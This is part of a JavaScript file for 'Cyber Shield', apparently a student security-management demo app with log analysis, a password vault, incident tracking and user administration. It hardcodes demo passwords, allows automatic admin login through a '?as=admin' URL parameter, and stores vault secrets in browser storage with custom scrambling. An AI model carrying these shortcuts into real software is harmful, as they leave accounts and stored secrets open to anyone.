      $('#g-text').oninput = e => { S.logText = e.target.value; };
      $('#g-sample').onclick = () => { S.logText = SAMPLE_LOG; $('#g-text').value = SAMPLE_LOG; };
      $('#g-file').onchange = e => { const f = e.target.files[0]; if (!f) return; const rd = new FileReader();
        rd.onload = () => { S.logText = String(rd.result).slice(0, 500000); $('#g-text').value = S.logText; }; rd.readAsText(f); };
      const draw = () => {
        const r = S.logReport; if (!r) { $('#g-out').innerHTML = ''; return; }
        const bad = r.findings.length, c = bad ? (bad >= 10 ? 'var(--critical)' : 'var(--high)') : 'var(--low)';
        $('#g-out').innerHTML = `<div class="banner" style="--c:${c}"><b>${bad ? `Found ${bad} suspicious lines` : 'Nothing suspicious found'}</b><span>out of ${r.total} lines.</span></div>
          <div class="grid2" style="margin-top:14px"><div class="card"><h3>What we found</h3>${Object.entries(r.byCategory).map(([k, v]) => `<div>${k}: <b>${v}</b></div>`).join('') || 'Nothing to count.'}
            ${Object.keys(r.bySource).length ? '<h3 style="margin-top:14px">Busiest addresses</h3>' + Core.topCounts(r.bySource, 5).map(([ip, n]) => `<div>${ip} &nbsp;(${n} lines)</div>`).join('') : ''}</div>
          <div class="card"><h3>Suspicious lines</h3><div class="console" style="padding:0;background:none;max-height:300px">${r.findings.map(f => `<div class="d">line ${f.line}  ${f.category}:  ${esc(f.text)}</div>`).join('') || '<div class="c">[CLEAN] No suspicious lines.</div>'}</div></div></div>`;
      };
      $('#g-go').onclick = () => act(() => {
        if (!S.logText.trim()) throw new Error('File error: there is nothing to analyze - load the sample log or open a file');
        S.logReport = Core.analyzeLog(S.logText);
        log('INFO', `${S.user.name} analyzed a log: ${S.logReport.findings.length} suspicious lines`);
        if ($('#g-make').checked)
          for (const [cat, n] of Object.entries(S.logReport.byCategory)) {
            if (n < 3) continue;
            const f = S.logReport.findings.find(x => x.category === cat && x.source);
            addIncident(`Log analysis: ${n} lines of ${cat}`, f ? f.source : 'log file', cat === 'Dangerous command' ? 'Critical' : 'High', S.user.name);
          }
        draw();
      });
      draw();
    } };
}

// ----- Safe Box (notes and passwords, scrambled and kept in this browser)
const vkey = () => 'cybershield_vault_' + S.user.name;
const store = { get(k) { try { return localStorage.getItem(k); } catch (e) { return store.m[k] || null; } },
  set(k, v) { try { localStorage.setItem(k, v); } catch (e) { store.m[k] = v; } }, m: {} };
function vaultSave() { const v = S.vault; store.set(vkey(), JSON.stringify({ hash: Core.hashPassword(v.key), blob: Core.encryptText(JSON.stringify(v.items), v.key) })); }
function pageVault() {
  return { html: `<div id="v-root"></div>`,
    bind() {
      const root = $('#v-root'), saved = store.get(vkey()), open = S.vault && S.vault.user === S.user.name;
      if (!open) {
        root.innerHTML = `<div class="card lockbox"><svg viewBox="0 0 100 120"><path d="M30 55V38a20 20 0 0 1 40 0v17" fill="none" stroke="var(--high)" stroke-width="9"/><rect x="14" y="52" width="72" height="62" rx="10" fill="var(--high)"/><circle cx="50" cy="78" r="8" fill="var(--card)"/><rect x="46" y="80" width="8" height="20" fill="var(--card)"/></svg>
          <h3>${saved ? 'Your Safe Box is locked' : 'Make your Safe Box'}</h3><p class="note">${saved ? 'Type your secret password to open it.' : 'Choose ONE secret password. It protects all your notes and passwords.'}</p>
          <label class="f">Secret password</label><input type="password" id="v-pw" autocomplete="off">
          ${saved ? '' : '<label class="f">Type it again</label><input type="password" id="v-pw2" autocomplete="off">'}
          <button class="btn blue full" id="v-go" style="margin-top:14px">${saved ? 'Unlock' : 'Create my Safe Box'}</button>
          <p class="hint">Remember it! If you forget it, nobody can open the box - not even us. Your box stays in this browser only, scrambled.</p></div>`;
        $('#v-go').onclick = () => act(() => {
          const pw = $('#v-pw').value;
          if (saved) {
            const d = JSON.parse(saved);
            if (d.hash !== Core.hashPassword(pw)) { log('WARN', 'Wrong Safe Box password was tried'); throw new Error('Login failed: that is not the right secret password'); }
            S.vault = { user: S.user.name, key: pw, items: JSON.parse(Core.decryptHex(d.blob, pw)) }; log('INFO', 'The Safe Box was unlocked');
          } else {
            if (pw.length < 4) throw new Error('Invalid input: the secret password needs at least 4 characters');
            if (pw !== $('#v-pw2').value) throw new Error('Invalid input: the two passwords are not the same');
            S.vault = { user: S.user.name, key: pw, items: [] }; vaultSave(); log('INFO', 'A Safe Box was created');
          }
          show('vault');
        });
        return;
      }
      const v = S.vault, sel = { id: null };
      root.innerHTML = `<div class="tools-row"><b style="color:var(--low);font-size:18px">The Safe Box is OPEN</b><span style="flex:1"></span><button class="btn amber" id="v-lock">Lock the box</button></div>
        <div class="split"><div><div class="tools-row"><input type="search" id="q-vault" placeholder="Search..." style="max-width:240px"></div>${tableBox('vault')}
          <div style="margin:10px 0;display:flex;gap:10px"><button class="btn red" id="v-del">Delete selected</button><button class="btn" id="v-show">${S.showSecret ? 'Hide' : 'Show'} password</button></div>
          <div class="console" id="v-detail">Pick something in the list to see what is inside.</div></div>
          <div><div class="card"><h3>Save a secret note (a document)</h3><label class="f">Title</label><input id="n-title"><label class="f">Your text</label><textarea id="n-text"></textarea>
            <button class="btn blue full" id="n-add" style="margin-top:10px">Lock this note away</button></div>
            <div class="card" style="margin-top:14px"><h3>Save a password</h3><label class="f">Website</label><input id="p-site"><label class="f">User name</label><input id="p-user">
              <label class="f">Password</label><div style="display:flex;gap:8px"><input id="p-pass"><button class="btn" id="p-gen">Make one</button></div><div class="meter" id="p-meter"></div>
              <button class="btn blue full" id="p-add" style="margin-top:10px">Lock this password away</button></div></div></div>`;
      const rows = () => v.items.map(i => ({ id: i.id, cells: [i.kind, i.kind === 'Note' ? i.title : `${i.site}  (${i.user || 'no user name'})`] }));
      const detail = id => {
        const i = v.items.find(x => x.id === id); sel.id = id;
        $('#v-detail').textContent = !i ? 'Pick something in the list to see what is inside.' : i.kind === 'Note' ? `${i.title}\n\n${i.text}` :
          `Website: ${i.site}\nUser name: ${i.user}\nPassword: ${S.showSecret ? i.pass : '*'.repeat(i.pass.length)}\nStrength: ${Core.passwordRating(i.pass)}`;
      };
      const redraw = () => { makeTable('vault', ['Kind', 'Name'], rows(), detail); T.vault.filter = $('#q-vault').value; drawTable('vault'); };
      $('#q-vault').oninput = () => { T.vault.filter = $('#q-vault').value; drawTable('vault'); };
      $('#v-lock').onclick = () => { S.vault = null; S.showSecret = false; log('INFO', 'The Safe Box was locked'); show('vault'); };
      $('#v-show').onclick = () => { S.showSecret = !S.showSecret; $('#v-show').textContent = (S.showSecret ? 'Hide' : 'Show') + ' password'; if (sel.id) detail(sel.id); };
      $('#v-del').onclick = () => act(() => { if (!sel.id) throw new Error('Invalid input: select a row in the list first');
        if (!confirm('Delete this item for ever?')) return; v.items = v.items.filter(i => i.id !== sel.id); vaultSave(); sel.id = null; T.vault.sel = null; redraw(); detail(null); });
      const nextId = () => Math.max(0, ...v.items.map(i => i.id)) + 1;
      $('#n-add').onclick = () => act(() => { const t = $('#n-title').value.trim(); if (!t) throw new Error('Invalid input: give your note a title');
        v.items.push({ id: nextId(), kind: 'Note', title: t, text: $('#n-text').value }); vaultSave(); $('#n-title').value = ''; $('#n-text').value = ''; redraw(); });
      $('#p-add').onclick = () => act(() => { const s = $('#p-site').value.trim(), p = $('#p-pass').value;
        if (!s) throw new Error('Invalid input: write the website or app name'); if (!p) throw new Error('Invalid input: the password cannot be empty');
        v.items.push({ id: nextId(), kind: 'Password', site: s, user: $('#p-user').value.trim(), pass: p }); vaultSave();
        ['#p-site', '#p-user', '#p-pass'].forEach(i => $(i).value = ''); $('#p-meter').textContent = ''; redraw(); });
      $('#p-gen').onclick = () => { $('#p-pass').value = Core.generatePassword(14); meter(); };
      const meter = () => { const p = $('#p-pass').value, r = Core.passwordRating(p); $('#p-meter').innerHTML = p ? `How strong is it? <span style="color:${r === 'Weak' ? 'var(--critical)' : r === 'OK' ? 'var(--medium)' : 'var(--low)'}">${r}</span>` : ''; };
      $('#p-pass').oninput = meter;
      redraw();
    } };
}

// ----- Problems
const incRows = () => S.incidents.map(i => ({ id: i.id, color: i.open ? sevColor(i.severity) : 'var(--resolved)',
  cells: ['INC-' + i.id, i.severity, i.open ? 'OPEN' : 'Fixed', i.title, i.device, shown(i.reporter)] }));
function pageProblems() {
  const adm = isAdmin();
  return { html: `
    <div class="split"><div><div class="tools-row"><input type="search" id="q-inc" placeholder="Search problems..." style="max-width:260px"></div>${tableBox('inc')}</div>
      <div class="card"><h3>Timeline of the selected problem</h3><div class="console" id="tl" style="min-height:140px">Click a problem to see its timeline.</div></div></div>
    <div class="grid2" style="margin-top:16px"><div class="card"><h3>Report a problem</h3>
        <label class="f">What happened?</label><input id="i-title"><label class="f">Which device?</label><input id="i-dev" placeholder="for example web-01">
        <label class="f">How serious?</label><select id="i-sev"><option>Low</option><option selected>Medium</option><option>High</option><option>Critical</option></select>
        <button class="btn blue full" id="i-add" style="margin-top:12px">Report problem</button></div>
      <div class="card"><h3>What to do with the selected problem</h3>
        <div class="row2"><button class="btn green" id="i-fix" ${adm ? '' : 'disabled'}>Mark as fixed</button><button class="btn amber" id="i-undo" ${adm && S.fixStack.length ? '' : 'disabled'}>Undo last fix</button></div>
        <label class="f">Assign to</label><div style="display:flex;gap:8px"><select id="i-who" ${adm ? '' : 'disabled'}>${S.users.map(u => `<option value="${u.name}">${esc(shown(u.name))}</option>`).join('')}</select>
          <button class="btn blue" id="i-assign" ${adm ? '' : 'disabled'}>Assign</button></div>
        <div style="margin-top:12px"><button class="btn" id="i-export">Export to text file</button></div>
        ${adm ? '' : '<p class="hint">Only an Admin can fix or assign problems.</p>'}</div></div>`,
    bind() {
      const tl = id => { const i = S.incidents.find(x => x.id === id); S.selInc = id;
        $('#tl').textContent = i ? i.events.map(e => maskText(`${e.t.slice(0, 16)}  ${e.who}  ${e.what}`)).join('\n') : 'Click a problem to see its timeline.'; };
      const redraw = () => { makeTable('inc', ['Id', 'How serious', 'Status', 'What happened', 'Device', 'Reported by'], incRows(), tl); T.inc.filter = $('#q-inc').value; drawTable('inc'); };
      const sel = () => { const i = S.incidents.find(x => x.id === S.selInc); if (!i) throw new Error('Invalid input: select a row in the list first'); return i; };
      $('#q-inc').oninput = () => { T.inc.filter = $('#q-inc').value; drawTable('inc'); };
      $('#i-add').onclick = () => act(() => { const t = $('#i-title').value.trim(), d = $('#i-dev').value.trim();
        if (!t || !d) throw new Error('Invalid input: title and asset are required'); if (t.includes('|') || d.includes('|')) throw new Error("Invalid input: the '|' character is not allowed");
        addIncident(t, d, $('#i-sev').value, S.user.name); $('#i-title').value = ''; show('problems'); });
      $('#i-fix').onclick = () => act(() => { const i = sel(); if (!i.open) throw new Error(`Invalid input: INC-${i.id} is already resolved`);
        i.open = false; i.events.push({ t: stamp(), who: S.user.name, what: 'Marked as fixed' }); S.fixStack.push(i.id); log('INFO', `${S.user.name} resolved INC-${i.id}`); show('problems'); });
      $('#i-undo').onclick = () => act(() => { const id = S.fixStack.pop(), i = S.incidents.find(x => x.id === id);
        i.open = true; i.events.push({ t: stamp(), who: S.user.name, what: 'Opened again (fix undone)' }); log('INFO', `${S.user.name} re-opened INC-${id}`); show('problems'); });
      $('#i-assign').onclick = () => act(() => { const i = sel(), who = $('#i-who').value;
        i.events.push({ t: stamp(), who: S.user.name, what: 'Assigned to ' + who }); log('INFO', `${S.user.name} assigned INC-${i.id} to ${who}`); show('problems'); });
      $('#i-export').onclick = () => download('incidents.txt', S.incidents.map(i => `${i.id}|${i.title}|${i.device}|${Core.SEVERITIES.indexOf(i.severity) + 1}|${i.open ? 0 : 1}|${i.reporter}`).join('\n') + '\n');
      redraw(); if (S.selInc) { T.inc.sel = S.selInc; drawTable('inc'); tl(S.selInc); }
    } };
}
function download(name, text) {
  const a = document.createElement('a'); a.href = URL.createObjectURL(new Blob([text], { type: 'text/plain' })); a.download = name; a.click(); URL.revokeObjectURL(a.href);
}

// ----- My Report
function buildReport() {
  const risk = Core.overallRisk(S.incidents), open = S.incidents.filter(i => i.open);
  let r = `CYBER SHIELD - SECURITY REPORT\n==============================\nGenerated for: ${S.user.name} (${S.user.role})\n\nSUMMARY\n` +
    `  Assets:            ${S.assets.length}\n  Open incidents:    ${open.length}\n  Threats detected:  ${S.threats}\n  Overall risk:      ${risk.percent}% (${risk.level})\n\nASSETS (${S.assets.length})\n`;
  for (const a of S.assets) r += `  #${a.id} [${a.type}] ${a.name} ip=${a.ip} criticality=${a.crit} secure=${Core.compliance(a)}%${a.type === 'Workstation' ? '' : ' alerts=' + a.alerts}\n`;
  r += '\nOPEN INCIDENTS BY SEVERITY\n';
  for (const s of [...Core.SEVERITIES].reverse()) r += `  ${s}: ${open.filter(i => i.severity === s).length}\n`;
  r += `\nINCIDENTS BY PRIORITY (${S.incidents.length})\n`;
  [...S.incidents].sort((a, b) => Core.SEVERITIES.indexOf(b.severity) - Core.SEVERITIES.indexOf(a.severity) || a.id - b.id)
    .forEach(i => { r += `  INC-${i.id} [${i.severity}] ${i.title} on ${i.device} (${i.open ? 'OPEN' : 'RESOLVED'}, by ${i.reporter})\n`; });
  if (isAdmin()) { r += '\nUSER ACCOUNTS (admin view)\n'; S.users.forEach(u => { r += `  ${u.name} (${u.role})\n`; });
    r += '\nPRIVACY NOTE: employee names are hidden (e******e) to protect their privacy.\n'; }
  return maskText(r);
}
function pageReport() {
  return { html: `<div class="tools-row"><button class="btn blue" id="r-refresh">Refresh</button><button class="btn green" id="r-save">Save report as a file</button></div><div class="console" id="r-out" style="max-height:none"></div>`,
    bind() { const draw = () => { $('#r-out').textContent = buildReport(); }; $('#r-refresh').onclick = draw;
      $('#r-save').onclick = () => { download('security_report.txt', buildReport()); log('INFO', S.user.name + ' saved the report'); }; draw(); } };
}

// ----- History (audit trail)
function pageHistory() {
  return { html: `<div class="tools-row"><label class="note">Level</label><select id="h-level" style="width:120px"><option>All</option><option>INFO</option><option>WARN</option><option>ERROR</option></select>
      <label class="note">User</label><input id="h-user" type="search" placeholder="a name or any word" style="max-width:200px"><span id="h-sum" class="note" style="margin-left:auto"></span></div>${tableBox('hist')}`,
    bind() {
      const draw = () => {
        const lv = $('#h-level').value, q = $('#h-user').value.trim().toLowerCase(), counts = {};
        S.audit.forEach(e => { counts[e.level] = (counts[e.level] || 0) + 1; });
        const rows = S.audit.map((e, i) => ({ e, i })).filter(x => lv === 'All' || x.e.level === lv)
          .map(x => ({ id: x.i, e: { ...x.e, msg: maskText(x.e.msg) } })).filter(x => !q || x.e.msg.toLowerCase().includes(q))
          .map(x => ({ id: x.id, color: x.e.level === 'WARN' ? 'var(--medium)' : x.e.level === 'ERROR' ? 'var(--critical)' : '', cells: [x.e.time, x.e.level, x.e.msg] }));
        makeTable('hist', ['When', 'Level', 'What happened'], rows.reverse(), null); drawTable('hist');
        $('#h-sum').textContent = `Showing ${rows.length} of ${S.audit.length} lines   |   ` + Object.entries(counts).map(([k, v]) => `${k} ${v}`).join('   ');
      };
      $('#h-level').onchange = draw; $('#h-user').oninput = draw; draw();
    } };
}

// ----- People (Admin only)
function pagePeople() {
  if (!isAdmin()) return { html: '<div class="card">Only an Admin can see the user accounts.</div>', bind() {} };
  return { html: `<div class="split"><div><div class="tools-row"><input type="search" id="q-ppl" placeholder="Search..." style="max-width:240px"></div>${tableBox('ppl')}</div>
      <div class="card"><h3>Add or remove people (Admin only)</h3><label class="f">Name</label><input id="u-name" autocomplete="off">
        <label class="f">Password</label><input type="password" id="u-pass" autocomplete="new-password"><div class="meter" id="u-meter" style="min-height:40px"></div>
        <label class="f">Role</label><select id="u-role"><option>Employee</option><option>Admin</option></select>
        <button class="btn blue full" id="u-add" style="margin-top:12px">Add person</button><button class="btn red full" id="u-del" style="margin-top:8px">Remove selected</button>
        <p class="hint">Privacy: employee names are hidden from the Admin (shown like e******e). An employee's Safe Box and passwords can never be seen by anyone else.</p></div></div>`,
    bind() {
      const redraw = () => { makeTable('ppl', ['Id', 'Name', 'Role', 'Activity'], S.users.map((u, i) => ({ id: i + 1,
        cells: ['#' + (i + 1), shown(u.name), u.role, u.role === 'Admin' ? '-' : `${S.incidents.filter(x => x.reporter === u.name).length} problem(s) reported`] })), null);
        T.ppl.filter = $('#q-ppl').value; drawTable('ppl'); };
      const meter = () => { const p = $('#u-pass').value, r = Core.passwordRating(p);
        $('#u-meter').innerHTML = !p ? 'Pick a strong password. Weak ones are refused.' : `Strength: <span style="color:${r === 'Weak' ? 'var(--critical)' : r === 'OK' ? 'var(--medium)' : 'var(--low)'}">${r} (${Core.passwordScore(p)}/100)</span>. ${esc(Core.passwordTip(p))}`; };
      $('#u-pass').oninput = meter; $('#q-ppl').oninput = redraw;
      $('#u-add').onclick = () => act(() => { const n = $('#u-name').value.trim(), p = $('#u-pass').value;
        if (!/^[A-Za-z0-9_]{1,20}$/.test(n)) throw new Error('Invalid input: username must be 1-20 letters or digits, without spaces');
        if (Core.passwordRating(p) === 'Weak') throw new Error('Invalid input: that password is too weak. ' + Core.passwordTip(p));
        if (S.users.some(u => u.name === n)) throw new Error(`Invalid input: user '${n}' already exists`);
        S.users.push({ name: n, role: $('#u-role').value, hash: Core.hashPassword(p) }); log('INFO', `User added: ${n} (${$('#u-role').value})`);
        $('#u-name').value = ''; $('#u-pass').value = ''; meter(); redraw(); });
      $('#u-del').onclick = () => act(() => { const t = T.ppl.sel; if (!t) throw new Error('Invalid input: select a row in the list first');
        const u = S.users[t - 1]; if (u.name === S.user.name) throw new Error('Invalid input: you cannot remove the account you are using');
        if (!confirm(`Remove user '${shown(u.name)}'?`)) return; S.users.splice(t - 1, 1); T.ppl.sel = null; log('INFO', 'User removed: ' + u.name); redraw(); });
      meter(); redraw();
    } };
}

const BUILD = { home: pageHome, devices: pageDevices, network: pageNetwork, attack: pageAttack, link: pageLink, logs: pageLogs,
  vault: pageVault, problems: pageProblems, report: pageReport, history: pageHistory, people: pagePeople };

// ---------------------------------------------------------------- the (i) "Concepts on this page" panel
const CONCEPTS = {
  home: [['Custom drawing (inheritance + overriding)', 'gui/StatCard.cpp, BarChart.cpp, RiskGauge.cpp, StatusBanner.cpp', 'Each is a child of Fl_Widget that overrides draw() to paint the cards, the chart and the gauge.'],
    ['Operator overloading: operator+', 'core/RiskScore.cpp', 'Adds the risk points of every open problem to make the danger level.'],
    ['Copy constructor + dynamic memory', 'core/SeverityCounts.cpp', 'The chart numbers live in a new int[4]; the copy constructor makes a deep copy.'],
    ['Callback with std::function', 'core/SecurityManager.h setAlertHandler()', 'The core says "a CRITICAL threat was found"; the window shows the blinking bar, toast and beep.']],
  devices: [['Abstract class + pure virtual functions', 'core/Asset.h', 'Asset is only an idea; you can only create a Workstation, Server or Router.'],
    ['Command pattern: undo / redo with TWO STACKS', 'core/AssetCommand.h', 'Every change is an object that can do and undo itself. Undo pops one stack and pushes onto the other.'],
    ['Operator overloading: operator< and operator+', 'core/AssetRisk.h', 'Risk parts are added with +; devices are ordered with < by std::sort, riskiest first.'],
    ['STL set', 'core/Asset.h', 'Remembers which checklist items are done; the compliance percentage feeds the risk.'],
    ['Class template', 'core/Repository.h', 'One generic box that owns the devices.']],
  network: [['Custom widget with draw() and handle()', 'gui/NetworkMap.cpp', 'Draws the hub, the lines and a round node per device; handle() finds the node you clicked.'],
    ['Operator overloading', 'core/AssetRisk.h', 'The node colour comes from the device risk.']],
  attack: [['Abstract class + pure virtual function', 'core/Threat.h', 'Every attack type must know how to detect itself.'],
    ['Runtime polymorphism', 'core/SecurityManager.cpp scan()', 'A loop over Threat* pointers calls detect(); the right version runs for each attack type.'],
    ['Function overloading', 'core/Threat.h', 'detect(text) and detect(number) share one name.'],
    ['STL queue', 'core/SecurityManager.h', '"Check it later" puts samples in a line, first in first out.'],
    ['Stack unwinding', 'core/SecurityManager.cpp', 'ScanGuard logs "Scan finished" even when a scan throws an error.']],
  link: [['Inheritance + overriding', 'core/LinkThreat.h', 'Another kind of Threat that overrides detect(), advice() and explanation().'],
    ['STL set and vector', 'core/LinkThreat.cpp', 'Known bad sites in a set; scam words in a vector.'], ['Exceptions', 'core/Exceptions.h', '"Not a link" is refused with a friendly message.']],
  logs: [['Text file handling', 'core/LogAnalyzer.cpp', 'Reads a log file; a missing file gives a FileException.'],
    ['STL map as a counter + function templates', 'core/Utils.h', 'countUp and topCounts count lines per kind and per IP.'],
    ['Two-pass algorithm', 'core/LogAnalyzer.cpp', 'Pass 1 remembers the ports each IP touched; pass 2 marks 5+ ports as a port scan.']],
  vault: [['Abstract class + hierarchy', 'core/VaultItem.h', 'SecureNote and PasswordEntry are the real kinds of item.'],
    ['Class template reuse', 'core/Vault.h', 'Repository<VaultItem> owns the items.'], ['Binary file I/O', 'core/Vault.cpp', 'A header, a password check and the scrambled items, written as bytes.'],
    ['Encapsulation + RAII', 'core/Vault.h', 'The key is private, wiped by lock(), and copying is deleted.']],
  problems: [['std::vector of structs (timeline)', 'core/Incident.h', 'Each problem keeps a list of events with time and person.'],
    ['Operator overloading', 'core/Incident.h', '<< prints, < orders by seriousness, >> reads a line of text.'], ['STL stack', 'core/SecurityManager.h', '"Undo last fix" takes the newest fix first.'],
    ['Static member', 'core/Incident.h', 'Incident::nextId gives INC-1, INC-2, ...'], ['Versioned binary file', 'core/Incident.cpp', 'New files store the timeline; old ones still open.']],
  report: [['Friend class', 'core/ReportWriter.h', 'The report writer may read the manager\'s private lists.'], ['Text file I/O', 'core/SecurityManager.cpp', 'Writes the report to a file.'],
    ['Privacy', 'core/SecurityManager.cpp', 'Employee names are replaced by e******e before the report leaves.']],
  history: [['Audit trail', 'core/AuditTrail.cpp', 'Reads the log back and splits every line into time, level and message.'], ['STL map', 'core/AuditTrail.cpp', 'The counters INFO / WARN / ERROR come from a map.'],
    ['Static members + text file I/O', 'core/Logger.cpp', 'Every action is appended to the log with the time.']],
  people: [['Password class with operators', 'core/Password.h', 'score(), rating(), tip(); operators <, ==, + and <<.'],
    ['Virtual base class (diamond)', 'core/Person.h', 'Person is shared by Employee and Admin; SecurityOfficer inherits both.'],
    ['Overriding for privacy', 'core/Employee.h', 'An Employee hides its real name (e******e).'], ['Upcasting + factory', 'core/SecurityManager.cpp makeUser()', 'Builds the right child and keeps it as a Person*.']],
};
function conceptsPanel(pageId) {
  const p = PAGES.find(x => x.id === pageId);
  $('#panel').innerHTML = `<button class="btn x" id="px">X</button><h3>Concepts: ${esc(p.title)}</h3><p class="note">The C++ concept, where it is in the code, and what it does here.</p>` +
    (CONCEPTS[pageId] || []).map(([t, w, u]) => { const m = w.match(/^((?:core|gui)\/[\w.]+)/);
      return `<div class="item"><b>${esc(t)}</b><small>Where: ${m ? `<a href="${REPO + m[1]}" target="_blank" rel="noopener">${esc(w)}</a>` : esc(w)}</small><span>${esc(u)}</span></div>`; }).join('') +
    `<p class="note">Open the <a href="https://github.com/vidulaj382-sys/cyber-shield" target="_blank" rel="noopener">GitHub project</a> to read the full C++ code.</p>`;
  $('#px').onclick = () => $('#panel').classList.remove('open');
}

// ---------------------------------------------------------------- shell, login, routing
const LOGO = '<svg width="38" height="42" viewBox="0 0 100 112"><path d="M50 3 88 19v33q0 22-38 57Q12 74 12 52V19z" fill="#38bdf8"/><path d="M50 14 78 26v26q0 16-28 41Q22 68 22 52V26z" fill="#2563eb"/><path d="M34 54l13 13 23-26" stroke="#fff" stroke-width="8" fill="none"/></svg>';

function loginView() {
  $('#app').innerHTML = `<div class="login"><div class="brand">${LOGO.replace('38', '110').replace('42', '124')}<h1>CYBER SHIELD</h1><div class="tag">Cybersecurity and Management System</div>
    <ul><li>Role based access control</li><li>Live threat detection</li><li>Incident tracking and reports</li></ul></div>
    <form class="form" id="lf" autocomplete="off"><h2>Welcome back</h2><div class="sub">Sign in to continue to your dashboard</div>
      <label class="f">Username</label><input id="lu" autofocus><label class="f">Password</label><input type="password" id="lp">
      <button class="btn blue full" style="margin-top:18px;padding:12px">Sign In</button><div class="err" id="le"></div>
      <div class="demo">Demo accounts (click to fill in)<div class="row"><button type="button" class="btn" data-u="admin" data-p="admin123">Admin</button><button type="button" class="btn" data-u="employee" data-p="emp123">Employee</button></div></div>
      <p class="note" style="margin-top:22px">A browser version of the C++ project. <a href="https://github.com/vidulaj382-sys/cyber-shield" target="_blank" rel="noopener">Source code on GitHub</a></p></form></div>`;
  document.querySelectorAll('[data-u]').forEach(b => b.onclick = () => { $('#lu').value = b.dataset.u; $('#lp').value = b.dataset.p; $('#le').textContent = ''; });
  $('#lf').onsubmit = e => { e.preventDefault(); const r = login($('#lu').value.trim(), $('#lp').value); if (r) $('#le').textContent = r; else shell(); };
}
// returns an error text, or '' when the login worked (SecurityManager::login)
function login(name, pw) {
  if (!name || !pw) return 'Invalid input: username and password are required';
  if (S.locked.has(name)) return `Login failed: account '${name}' is locked after a brute-force attempt`;
  const u = S.users.find(x => x.name === name);
  if (!u || u.hash !== Core.hashPassword(pw)) {
    const n = S.failed[name] = (S.failed[name] || 0) + 1;
    log('WARN', `Failed login for '${name}' (attempt ${n})`);
    if (n >= 5) { S.locked.add(name); S.threats++; addIncident('Brute-force attack on account ' + name, 'Login Portal', 'High', 'system'); return 'Login failed: too many failed attempts - account locked'; }
    return `Login failed: wrong username or password (attempt ${n})`;
  }
  delete S.failed[name]; S.user = u; log('INFO', `${u.name} (${u.role}) logged in`); return '';
}
function logout() { if (S.user) log('INFO', S.user.name + ' logged out'); S.user = null; S.vault = null; S.showSecret = false; S.selAsset = S.selInc = null; loginView(); }

function shell() {
  $('#app').innerHTML = `<div class="shell"><aside class="side"><div class="logo">${LOGO}<div><b>CYBER SHIELD</b><small>Keeping you safe</small></div></div>
    <nav class="nav">${PAGES.map(p => `<button data-p="${p.id}">${esc(p.title)}</button>`).join('')}</nav>
    <div class="badge"><div class="avatar">${esc(S.user.name[0].toUpperCase())}</div><div><b>${esc(S.user.name)}</b><small>${S.user.role}</small></div></div>
    <button class="btn red full" id="lo">Logout</button></aside>
    <main class="main"><div class="alertbar" id="alertbar"></div><div class="top"><div><h2 id="pt"></h2><div class="sub" id="ps"></div></div>
      <div class="tools"><button class="btn" id="theme"></button><button class="btn blue" id="info">(i) Concepts on this page</button></div></div><div class="page" id="content"></div></main></div>`;
  document.querySelectorAll('.nav button').forEach(b => b.onclick = () => show(b.dataset.p));
  $('#lo').onclick = logout;
  $('#theme').onclick = () => { document.documentElement.classList.toggle('light'); store.set('cybershield_theme', document.documentElement.classList.contains('light') ? 'light' : 'dark'); themeLabel(); };
  $('#info').onclick = () => { conceptsPanel(S.page); $('#panel').classList.toggle('open'); };
  themeLabel(); show(S.page);
}
const themeLabel = () => { const t = $('#theme'); if (t) t.textContent = document.documentElement.classList.contains('light') ? 'Dark mode' : 'Light mode'; };

function show(id) {
  if (!S.user) return;
  const p = PAGES.find(x => x.id === id) || PAGES[0]; S.page = p.id;
  try { history.replaceState(null, '', '#' + p.id); } catch (e) { /* ignore */ }
  document.querySelectorAll('.nav button').forEach(b => b.classList.toggle('on', b.dataset.p === p.id));
  $('#pt').textContent = p.title; $('#ps').textContent = p.sub;
  const page = BUILD[p.id](); $('#content').innerHTML = page.html; page.bind();
  if ($('#panel').classList.contains('open')) conceptsPanel(p.id);
}

// ---------------------------------------------------------------- start
(function start() {
  if (store.get('cybershield_theme') === 'light') document.documentElement.classList.add('light');
  seed();
  // handy for sharing: index.html?as=admin opens straight into the app, #devices opens a page
  const as = new URLSearchParams(location.search).get('as');
  const demo = { admin: 'admin123', employee: 'emp123' }[as];
  const page = location.hash.slice(1);
  if (demo && !login(as, demo)) { if (PAGES.some(p => p.id === page)) S.page = page; shell(); } else loginView();
})();
})();
